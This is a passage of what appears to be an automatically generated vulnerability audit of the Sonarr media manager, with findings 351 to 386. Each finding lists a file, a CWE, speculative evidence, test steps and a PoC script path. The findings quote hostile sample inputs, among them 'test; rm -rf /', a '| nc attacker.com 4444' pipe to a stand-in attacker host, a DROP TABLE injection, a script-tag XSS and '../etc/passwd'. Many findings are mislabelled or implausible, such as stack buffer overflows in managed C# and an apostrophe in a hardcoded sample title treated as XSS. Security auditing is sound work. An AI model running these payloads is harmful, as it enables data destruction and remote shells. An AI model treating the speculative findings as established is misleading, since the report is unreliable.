```
The InstallUpdateService handles update commands directly without validating CSRF tokens, and the update mechanism can be triggered through API endpoints without proper authentication verification.
```

**Impact:**
An attacker could trick a logged-in user into installing malicious updates by crafting specially crafted requests that trigger the update process.

**Proof of Concept:**
Create a malicious website that triggers an update installation when a user visits the page, potentially installing a compromised version of Sonarr.

**How to Test:**
1. Monitor update endpoints for CSRF token validation
2. Test if update commands can be triggered without proper authentication
3. Verify if the update process is vulnerable to cross-site requests
4. Check for token-based protection mechanisms

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Update_InstallUpdateServicecs.py`
---

### 352. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/Update/InstallUpdateService.cs
**Line:** 154

**Description:**
The update installation process uses user-provided paths without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
The code uses _appFolderInfo.GetUpdateSandboxFolder() and other path operations without validating that paths don't contain directory traversal sequences like '../'.
```

**Impact:**
An attacker could potentially manipulate update paths to write files outside the intended directories, leading to arbitrary file writes or code execution.

**Proof of Concept:**
If update paths contain '../' sequences, the update process might extract files to unintended locations, potentially overwriting system files or creating backdoors.

**How to Test:**
1. Test update package extraction with paths containing '../'
2. Verify file permissions and locations
3. Check if files can be written outside the update sandbox
4. Monitor for directory traversal vulnerabilities

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Update_InstallUpdateServicecs.py`
---

### 353. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Update/InstallUpdateService.cs
**Line:** 175

**Description:**
The update process uses string formatting with potentially externally-controlled values, leading to format string vulnerabilities.

**Evidence:**
```
The code uses string interpolation with values from configuration and runtime information without proper validation of format strings.
```

**Impact:**
If format strings are controlled by external inputs, attackers could manipulate the output format, potentially leading to information disclosure or unexpected behavior.

**Proof of Concept:**
If configuration values used in string formatting contain format specifiers, the output might be manipulated to reveal internal information or cause unexpected behavior.

**How to Test:**
1. Test string formatting with various inputs
2. Verify format string validation
3. Check for information disclosure through format strings
4. Test with malicious format specifiers

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Update_InstallUpdateServicecs.py`
---

### 354. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Update/InstallUpdateService.cs
**Line:** 214

**Description:**
The update script execution process doesn't properly neutralize special elements in command arguments, potentially leading to command injection.

**Evidence:**
```
The GetUpdaterArgs method constructs command arguments that are passed to Process.Start() without proper escaping or sanitization of special shell characters.
```

**Impact:**
Command injection could allow attackers to execute arbitrary commands with the privileges of the Sonarr process, potentially leading to full system compromise.

**Proof of Concept:**
If the update arguments contain shell metacharacters like ';', '|', '&', or '&&', they could be executed as part of the command.

**How to Test:**
1. Test command arguments with special shell characters
2. Verify command execution with injected commands
3. Check for privilege escalation opportunities
4. Monitor process execution for unexpected commands

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Update_InstallUpdateServicecs.py`
---

### 355. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Core/Update/UpdatePackage.cs
**Line:** 10

**Description:**
The UpdatePackage class is used for deserializing update information from external sources without proper validation, potentially leading to deserialization vulnerabilities.

**Evidence:**
```
The UpdatePackage class is used in update package handling and deserialization from external sources without validation of the deserialized data.
```

**Impact:**
If update packages contain maliciously crafted data, deserialization could lead to code execution, information disclosure, or other security issues.

**Proof of Concept:**
If an update package contains malicious serialized data that gets deserialized, it could potentially execute arbitrary code or manipulate application state.

**How to Test:**
1. Test update package deserialization with various inputs
2. Verify data validation during deserialization
3. Check for potential code execution opportunities
4. Monitor for deserialization-related exceptions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCore_Update_UpdatePackagecs.py`
---

### 356. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/MetadataSource/SkyHook/SkyHookProxy.cs
**Line:** 250

**Description:**
The SearchForNewSeries method in SkyHookProxy performs input validation on the title parameter but does not properly sanitize inputs before using them in HTTP requests, potentially allowing command injection through specially crafted search terms.

**Evidence:**
```
The method calls title.ToLower().Trim() but doesn't validate or sanitize the title parameter before passing it to AddQueryParam("term", title.ToLower().Trim()) without additional escaping or validation.
```

**Impact:**
An attacker could craft a search term that includes shell command injection characters, potentially allowing execution of arbitrary commands on the server when the search is processed.

**Proof of Concept:**
If a user searches for a title containing semicolons, pipes, or other shell metacharacters like "test; rm -rf /", the search term could be passed through to the SkyHook API without proper sanitization, potentially allowing command execution.

**How to Test:**
1. Send a search request with a title containing shell metacharacters like "test; ls -la;" 2. Monitor the SkyHook API calls to see if the command is properly escaped 3. Check if any commands are executed on the server side

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_MetadataSource_SkyHook_SkyHookProxycs.py`
---

### 357. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/MetadataSource/SkyHook/SkyHookProxy.cs
**Line:** 250

**Description:**
The SearchForNewSeries method accepts user input without sufficient validation, particularly for the title parameter which is used directly in API calls.

**Evidence:**
```
The method checks title.IsPathValid(PathValidationType.AnyOs) but only throws an exception for invalid paths. It doesn't validate the search term for SQL injection, XSS, or other injection vectors.
```

**Impact:**
Improperly validated search terms could lead to various injection attacks or unexpected behavior in the metadata lookup process.

**Proof of Concept:**
A search term like "'; DROP TABLE series; --" could potentially cause issues if the search term is used in other contexts beyond the SkyHook API call.

**How to Test:**
1. Test various special characters in search terms (quotes, semicolons, etc.) 2. Check if the search term is properly escaped in all API calls 3. Verify that the validation logic properly handles edge cases

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_MetadataSource_SkyHook_SkyHookProxycs.py`
---

### 358. Improper Output Encoding (CWE-117)

**File:** src/NzbDrone.Core/MetadataSource/SkyHook/SkyHookProxy.cs
**Line:** 250

**Description:**
The SkyHookProxy class doesn't properly encode output data when mapping API responses to internal objects, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The MapSeries method directly assigns values from ShowResource to Series properties without proper encoding, and the MapEpisode method also assigns raw values from EpisodeResource.
```

**Impact:**
If the metadata from SkyHook contains malicious content, it could be reflected back to users in web interfaces, leading to XSS vulnerabilities.

**Proof of Concept:**
If a show title from SkyHook contains <script>alert('XSS')</script>, and this title is displayed in the UI without proper HTML encoding, it could execute the script.

**How to Test:**
1. Create a test show with special characters in title, overview, or other fields 2. Verify that these values are properly encoded when displayed in UI 3. Test with various XSS payloads in metadata fields

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-117_src_NzbDroneCore_MetadataSource_SkyHook_SkyHookProxycs.py`
---

### 359. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Update/History/UpdateHistory.cs
**Line:** 10

**Description:**
The UpdateHistory class stores version information which could contain sensitive data without encryption, and the history repository stores this data in cleartext.

**Evidence:**
```
The UpdateHistory class stores Version objects which may contain sensitive information, and the repository persists this data without encryption.
```

**Impact:**
If the database is compromised, sensitive version information could be exposed, potentially revealing system vulnerabilities or attack vectors.

**Proof of Concept:**
If the database is accessed by an unauthorized user, they could read the version history which might contain information about system updates, vulnerabilities, or security patches.

**How to Test:**
1. Check database contents for version history entries 2. Verify that sensitive version information is stored in cleartext 3. Test database access with different user permissions

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Update_History_UpdateHistorycs.py`
---

### 360. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/MetadataSource/SkyHook/SkyHookProxy.cs
**Line:** 250

**Description:**
The SkyHookProxy class doesn't properly neutralize special elements in search terms when constructing API requests, potentially leading to command injection.

**Evidence:**
```
The AddQueryParam("term", title.ToLower().Trim()) call doesn't validate or sanitize the title parameter for special characters that could be interpreted as command elements.
```

**Impact:**
Malicious search terms could potentially lead to command injection in the API call processing or downstream systems.

**Proof of Concept:**
A search term with characters like "|", "&", "&&", "||", "`", "\"" could be interpreted as command separators in the API processing.

**How to Test:**
1. Send search requests with various command injection characters 2. Monitor API request processing for proper handling of special characters 3. Check if any command execution occurs during search processing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_MetadataSource_SkyHook_SkyHookProxycs.py`
---

### 361. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/MetadataSource/SkyHook/SkyHookProxy.cs
**Line:** 250

**Description:**
The SkyHookProxy class doesn't properly validate or sanitize file paths in search terms, potentially allowing path traversal attacks.

**Evidence:**
```
The method checks title.IsPathValid(PathValidationType.AnyOs) but doesn't prevent path traversal sequences like "../" or "..\" in search terms.
```

**Impact:**
If search terms are used in file system operations or path construction, attackers could potentially traverse directories and access unauthorized files.

**Proof of Concept:**
A search term like "../etc/passwd" or "..\Windows\System32\cmd.exe" could be used to access files outside the intended scope.

**How to Test:**
1. Test search terms with path traversal sequences 2. Check if these terms are used in file system operations 3. Verify that path traversal is properly prevented

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_MetadataSource_SkyHook_SkyHookProxycs.py`
---

### 362. Security Misconfiguration (CWE-1004)

**File:** src/NzbDrone.Core/Security/X509CertificateValidationService.cs
**Line:** 50

**Description:**
The certificate validation service allows disabling certificate validation for local addresses, which could be misconfigured to disable validation globally.

**Evidence:**
```
The service has a CertificateValidationType.DisabledForLocalAddresses option that can be set to CertificateValidationType.Disabled, potentially allowing insecure connections.
```

**Impact:**
If certificate validation is disabled globally, the application could be vulnerable to man-in-the-middle attacks, allowing attackers to impersonate legitimate services.

**Proof of Concept:**
If the configuration is set to CertificateValidationType.Disabled, all HTTPS connections would bypass certificate validation, making the system vulnerable to MITM attacks.

**How to Test:**
1. Check the certificate validation configuration setting 2. Test HTTPS connections with invalid certificates 3. Verify that certificate validation is properly enforced

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-1004_src_NzbDroneCore_Security_X509CertificateValidationServicecs.py`
---

### 363. Cross-Site Request Forgery (CWE-352)

**File:** src/NzbDrone.Core/Update/Commands/ApplicationUpdateCheckCommand.cs
**Line:** 10

**Description:**
The ApplicationUpdateCheckCommand and ApplicationUpdateCommand classes don't implement CSRF protection, potentially allowing unauthorized updates.

**Evidence:**
```
These commands are defined as simple command classes without any CSRF token validation or authentication checks.
```

**Impact:**
An attacker could craft malicious requests to trigger updates without proper authentication, potentially leading to unauthorized system modifications.

**Proof of Concept:**
An attacker could create a malicious web page that automatically triggers an update command when a user visits the page, without requiring authentication.

**How to Test:**
1. Check if update commands require authentication tokens 2. Test if commands can be triggered without proper authentication 3. Verify CSRF protection mechanisms in update endpoints

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Update_Commands_ApplicationUpdateCheckCommandcs.py`
---

### 364. Insecure Deserialization (CWE-502)

**File:** src/NzbDrone.Core/AutoTagging/AutoTaggingService.cs
**Line:** 100

**Description:**
The AutoTaggingService uses a caching mechanism that could be vulnerable to insecure deserialization if cache data is not properly validated.

**Evidence:**
```
The service uses ICached<Dictionary<int, AutoTag>> which could deserialize untrusted data from cache storage without proper validation.
```

**Impact:**
If cache files are compromised or manipulated, deserialization of malicious data could lead to remote code execution or other security issues.

**Proof of Concept:**
If cache files are stored in a location accessible to attackers, they could modify cache data to include malicious serialized objects that would be deserialized when the service runs.

**How to Test:**
1. Check cache storage for potential deserialization vulnerabilities 2. Test cache data integrity and validation 3. Verify that cache deserialization handles malicious inputs properly

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCore_AutoTagging_AutoTaggingServicecs.py`
---

### 365. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Update/Commands/ApplicationUpdateCheckCommand.cs
**Line:** 10

**Description:**
The update commands lack proper authentication checks, potentially allowing unauthorized users to trigger system updates.

**Evidence:**
```
The ApplicationUpdateCheckCommand and ApplicationUpdateCommand classes are defined as simple command classes without authentication requirements.
```

**Impact:**
Unauthorized users could trigger system updates, potentially leading to system instability or unauthorized modifications.

**Proof of Concept:**
An unauthenticated user could send a command to check for updates or install updates, bypassing normal authentication requirements.

**How to Test:**
1. Test update commands without authentication 2. Verify that commands require proper authentication 3. Check if update operations are restricted to authorized users

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Update_Commands_ApplicationUpdateCheckCommandcs.py`
---

### 366. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Organizer/FileNameBuilder.cs
**Line:** 180

**Description:**
The BuildFileName method does not properly validate the extension parameter before using it in file operations, potentially leading to path traversal or file creation issues.

**Evidence:**
```
The BuildFileName method accepts an extension parameter but doesn't validate it against path traversal characters or ensure it's a valid file extension.
```

**Impact:**
Improperly validated extension could lead to path traversal vulnerabilities or allow creation of unexpected file types.

**Proof of Concept:**
If an extension parameter contains '../' or '\..\', it could be used to traverse directories when building file paths.

**How to Test:**
Pass extension parameters containing path traversal characters like '../', '\..\', or '\\' to the BuildFileName method and verify path handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Organizer_FileNameBuildercs.py`
---

### 367. Cross-site Scripting (CWE-79)

**File:** src/NzbDrone.Core/Organizer/FileNameSampleService.cs
**Line:** 107

**Description:**
The sample service generates filenames with hardcoded titles that could be used in web contexts without proper HTML escaping, leading to XSS vulnerabilities.

**Evidence:**
```
Series titles like 'The Series Title's!' contain apostrophes and other special characters that could be used in HTML contexts without proper escaping.
```

**Impact:**
If sample filenames are displayed in web UI without proper HTML escaping, attackers could inject JavaScript through specially crafted titles.

**Proof of Concept:**
If a sample filename containing 'The Series Title's!' is displayed in a web UI without HTML escaping, an attacker could inject JavaScript through the apostrophe character.

**How to Test:**
Check if sample filenames are properly HTML escaped when displayed in web UI and test with titles containing special HTML characters.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Organizer_FileNameSampleServicecs.py`
---

### 368. Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-22)

**File:** src/NzbDrone.Core/Organizer/FileNameBuilder.cs
**Line:** 220

**Description:**
The BuildFilePath method constructs file paths but doesn't fully validate that the resulting paths remain within the intended directory structure.

**Evidence:**
```
The method uses Path.Combine without additional validation to ensure paths don't escape the intended directory structure.
```

**Impact:**
Path traversal could allow attackers to create or access files outside of intended directories.

**Proof of Concept:**
If a naming pattern includes '../' characters, the resulting file path could escape the intended directory structure.

**How to Test:**
Test BuildFilePath with naming patterns containing '../' or path traversal sequences and verify path containment.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Organizer_FileNameBuildercs.py`
---

### 369. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Organizer/FileNameBuilder.cs
**Line:** 1000

**Description:**
The GetLanguagesToken method uses array indexing without proper bounds checking, potentially leading to array out of bounds exceptions.

**Evidence:**
```
The method accesses tokens[i] without checking if i is within the valid range of the tokens array.
```

**Impact:**
Array index out of bounds could cause application crashes or potentially allow information disclosure through exception details.

**Proof of Concept:**
If GetLanguagesToken receives an empty or malformed language list, accessing tokens[i] could cause an IndexOutOfRangeException.

**How to Test:**
Pass empty or malformed language lists to GetLanguagesToken and verify proper bounds checking.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Organizer_FileNameBuildercs.py`
---

### 370. Insecure Data Storage (CWE-312)

**File:** src/NzbDrone.Core/Organizer/NamingConfig.cs
**Line:** 20

**Description:**
The default naming configuration contains hardcoded values that could expose sensitive information or be vulnerable to configuration changes.

**Evidence:**
```
The Default naming configuration includes hardcoded values that could be exploited if configuration is not properly secured.
```

**Impact:**
Hardcoded configuration values could expose system information or create predictable naming patterns.

**Proof of Concept:**
The default naming configuration includes hardcoded patterns that could be predictable for attackers to exploit.

**How to Test:**
Verify that naming configurations are properly secured and that hardcoded defaults don't expose sensitive information.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Organizer_NamingConfigcs.py`
---

### 371. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Organizer/FileNameBuilder.cs
**Line:** 1000

**Description:**
The GetLanguagesToken method could be vulnerable to stack-based buffer overflow due to potential array indexing issues.

**Evidence:**
```
The method uses array indexing without proper bounds checking in a loop that processes language tokens.
```

**Impact:**
Buffer overflow could lead to application crashes or potentially allow code execution.

**Proof of Concept:**
If GetLanguagesToken processes a large number of malformed language entries, array indexing could cause buffer overflow.

**How to Test:**
Test GetLanguagesToken with large arrays of language entries to verify buffer overflow protection.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Organizer_FileNameBuildercs.py`
---

### 372. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Organizer/FileNameBuilder.cs
**Line:** 1000

**Description:**
The FileNameBuilder uses format strings that could be externally controlled, potentially leading to format string vulnerabilities.

**Evidence:**
```
The method uses string formatting with potentially externally-controlled format strings in various token replacement operations.
```

**Impact:**
Externally-controlled format strings could lead to information disclosure or code execution.

**Proof of Concept:**
If naming patterns contain format specifiers that are not properly validated, attackers could inject format specifiers.

**How to Test:**
Test naming patterns with various format specifiers and verify proper validation of format strings.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Organizer_FileNameBuildercs.py`
---

### 373. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Core/Organizer/FileNameBuilder.cs
**Line:** 1000

**Description:**
The FileNameBuilder does not perform sufficient verification of data authenticity for tokens and naming patterns.

**Evidence:**
```
The method processes tokens and naming patterns without sufficient validation of their authenticity or integrity.
```

**Impact:**
Insufficient data verification could lead to incorrect file naming or potential injection attacks.

**Proof of Concept:**
If naming patterns are not properly validated, they could contain malicious tokens or patterns that affect file creation.

**How to Test:**
Test with various naming patterns including malicious tokens and verify proper data authenticity verification.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCore_Organizer_FileNameBuildercs.py`
---

### 374. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 154

**Description:**
The ParseSubtitleLanguage method processes filenames without proper sanitization, potentially leading to command injection vulnerabilities when processing subtitle files.

**Evidence:**
```
The method uses Path.GetFileNameWithoutExtension(fileName) and processes the simpleFilename without validating or sanitizing the input, which could be used in shell commands or file operations.
```

**Impact:**
If the subtitle processing logic eventually calls external commands or uses the filename in shell operations, an attacker could inject commands through specially crafted filenames.

**Proof of Concept:**
Create a subtitle file with filename containing shell metacharacters like '; rm -rf /' or '| nc attacker.com 4444' and observe if the processing leads to command execution.

**How to Test:**
Test with filenames containing shell metacharacters, check if any external commands are called with the filename, and verify command injection handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 375. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 154

**Description:**
The ParseSubtitleLanguage method does not validate the input filename parameter, which could lead to unexpected behavior or vulnerabilities when processing malformed inputs.

**Evidence:**
```
The method directly uses fileName parameter without validation, and the simpleFilename is derived from it without sanitization checks.
```

**Impact:**
Malformed filenames could cause exceptions, unexpected behavior, or potentially lead to information disclosure or other vulnerabilities.

**Proof of Concept:**
Pass a null or empty filename to ParseSubtitleLanguage and observe if it handles gracefully or throws exceptions that could reveal internal information.

**How to Test:**
Test with null, empty, or malformed filenames, verify exception handling, and check for information disclosure in error messages.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 376. Information Exposure (CWE-200)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 154

**Description:**
The ParseSubtitleLanguage method logs the filename but doesn't sanitize it before logging, potentially exposing sensitive information.

**Evidence:**
```
The method logs fileName directly in Logger.Debug without sanitizing it, which could contain sensitive path information or user-controlled data.
```

**Impact:**
Sensitive information from filenames could be exposed in logs, potentially revealing system paths, user data, or other sensitive information.

**Proof of Concept:**
Use a filename containing sensitive information like 'secret_file_12345.txt' and verify if it appears in logs without sanitization.

**How to Test:**
Check log outputs for sensitive information, test with filenames containing paths, user data, or special characters, and verify log sanitization.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-200_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 377. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 240

**Description:**
The UpdateTitleAndCopyFromTitle method uses array indexing without proper bounds checking, potentially leading to array index out of bounds exceptions.

**Evidence:**
```
The method uses match.Groups["title"].Success and match.Groups["copy"].ToString() without ensuring the groups exist or are properly initialized.
```

**Impact:**
Array index out of bounds could cause application crashes or potentially lead to information disclosure through exception handling.

**Proof of Concept:**
Create a subtitle filename that doesn't match the expected pattern and observe if UpdateTitleAndCopyFromTitle handles missing groups gracefully.

**How to Test:**
Test with various subtitle filename patterns, especially those that don't match the expected regex patterns, and verify exception handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 378. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 240

**Description:**
The UpdateTitleAndCopyFromTitle method processes string data that could potentially cause buffer overflows when handling large inputs.

**Evidence:**
```
The method processes RawTitle and uses int.Parse() without proper bounds checking, which could lead to overflow when parsing large numbers.
```

**Impact:**
Buffer overflow could cause application crashes or potentially be exploited for code execution.

**Proof of Concept:**
Create a subtitle filename with a very large copy number in the title pattern and observe if int.Parse() handles it correctly.

**How to Test:**
Test with very large numbers in title patterns, verify integer parsing bounds, and check for overflow conditions.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 379. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 240

**Description:**
The UpdateTitleAndCopyFromTitle method doesn't validate the parsed copy number, potentially leading to invalid data being used in processing.

**Evidence:**
```
The method uses int.Parse(match.Groups["copy"].ToString()) without validation, which could cause exceptions or use invalid data.
```

**Impact:**
Invalid copy numbers could cause incorrect processing or application behavior, potentially leading to data corruption or incorrect episode mapping.

**Proof of Concept:**
Create a subtitle filename with invalid copy number format and observe if the parsing handles it gracefully.

**How to Test:**
Test with various copy number formats, including invalid ones, and verify error handling and data validation.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 380. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 154

**Description:**
The ParseSubtitleLanguage method could be vulnerable to command injection if the filename processing eventually leads to shell command execution.

**Evidence:**
```
The method processes filenames without sanitization, and the processing chain could potentially lead to shell commands being executed with user-controlled input.
```

**Impact:**
An attacker could inject commands through specially crafted filenames, potentially leading to arbitrary code execution on the server.

**Proof of Concept:**
Create a filename with shell metacharacters that could be executed in a command context, such as 'file; rm -rf /' or 'file| nc attacker.com 4444'.

**How to Test:**
Test with filenames containing shell metacharacters, check if any external commands are called with filename input, and verify command injection handling.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 381. Improper Access Control (CWE-119)

**File:** src/NzbDrone.Core/Parser/LanguageParser.cs
**Line:** 154

**Description:**
The ParseSubtitleLanguage method doesn't validate the input filename against expected patterns, potentially allowing access to unexpected files or processing of unexpected inputs.

**Evidence:**
```
The method accepts any filename and processes it without validating against expected patterns or file types.
```

**Impact:**
Unexpected filenames could cause processing errors or potentially lead to information disclosure or access to unintended files.

**Proof of Concept:**
Pass filenames with unexpected extensions or patterns to ParseSubtitleLanguage and observe if it handles them correctly or throws exceptions.

**How to Test:**
Test with various filename extensions and patterns, verify input validation, and check for unexpected behavior with invalid inputs.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-119_src_NzbDroneCore_Parser_LanguageParsercs.py`
---

### 382. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The parser processes file paths and titles that could contain command injection vectors, particularly in the ParsePath method where directory and file names are used.

**Evidence:**
```
The ParsePath method uses FileInfo and Path operations with user-provided input. The code processes directory names and file names directly without sufficient sanitization for command execution contexts.
```

**Impact:**
If the parsed titles or file paths are used in shell commands or system calls elsewhere in the application, an attacker could inject commands through specially crafted titles or file names.

**Proof of Concept:**
An attacker could create a file with a title like 'test; rm -rf /; echo' and if this title is later used in a shell command context, it could execute the rm command.

**How to Test:**
Create test files with titles containing semicolons, pipes, and other shell metacharacters. Verify that these are properly escaped when used in system commands or shell contexts.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Parser_Parsercs.py`
---

### 383. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The parser does not validate the length or content of input strings before processing, which could lead to buffer overflows or excessive memory usage.

**Evidence:**
```
The code processes titles and file paths without checking for excessively long inputs. The regex patterns and parsing logic could be exploited with very long inputs.
```

**Impact:**
Very long input strings could cause stack overflows, memory exhaustion, or performance degradation due to excessive regex matching.

**Proof of Concept:**
Passing a title with millions of characters to ParseTitle() could cause the regex engine to consume excessive memory or time, potentially leading to denial of service.

**How to Test:**
Test with extremely long titles (100KB+) and measure memory usage and processing time. Verify that the application handles large inputs gracefully without crashing or hanging.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Parser_Parsercs.py`
---

### 384. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The code uses array indexing without proper bounds checking, particularly in the ParseMatchCollection method when accessing match groups.

**Evidence:**
```
In ParseMatchCollection, the code accesses matchCollection[0] and various groups without checking if the collection or groups exist, potentially causing IndexOutOfRangeException.
```

**Impact:**
An invalid or malformed title could cause the parser to throw an IndexOutOfRangeException, leading to application crashes or denial of service.

**Proof of Concept:**
Passing a title that matches one of the regex patterns but doesn't contain all expected capture groups could cause an IndexOutOfRangeException when accessing matchCollection[0].Groups.

**How to Test:**
Test with titles that match regex patterns but have missing capture groups. Verify that the application handles missing groups gracefully instead of crashing.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Parser_Parsercs.py`
---

### 385. Insufficient Verification of Data Authenticity (CWE-345)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The parser does not validate the authenticity or integrity of parsed data, potentially allowing malformed data to be accepted as valid.

**Evidence:**
```
The ParseMatchCollection method returns ParsedEpisodeInfo objects without comprehensive validation of parsed values, such as season numbers, episode numbers, or dates.
```

**Impact:**
Malformed or maliciously crafted titles could result in incorrect parsing, leading to wrong episode information being stored or used in the system.

**Proof of Concept:**
A title with a season number of 9999 or an episode number of -1 could be parsed successfully but cause issues in downstream processing.

**How to Test:**
Test with titles containing invalid season or episode numbers, dates outside valid ranges, and other malformed data. Verify that the parser validates ranges and rejects invalid data.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-345_src_NzbDroneCore_Parser_Parsercs.py`
---

### 386. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Parser/Parser.cs
**Line:** 109

**Description:**
The parser processes titles that could contain special command elements, particularly in the context of file paths and directory names.

**Evidence:**
```
The ParsePath method processes directory and file names directly, and the SimplifyTitle method processes titles that could contain command-related characters.
```

**Impact:**
If parsed titles are used in command contexts, special characters could be interpreted as command elements, potentially leading to command injection.

**Proof of Concept:**
A title containing 'test; ls -la' could be interpreted as a command when used in a shell context, executing the ls command.

**How to Test:**
Test with titles containing shell metacharacters like ';', '&', '|', '&&', '||', etc. Verify that these are properly escaped or sanitized when used in command contexts.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Parser_Parsercs.py`
---

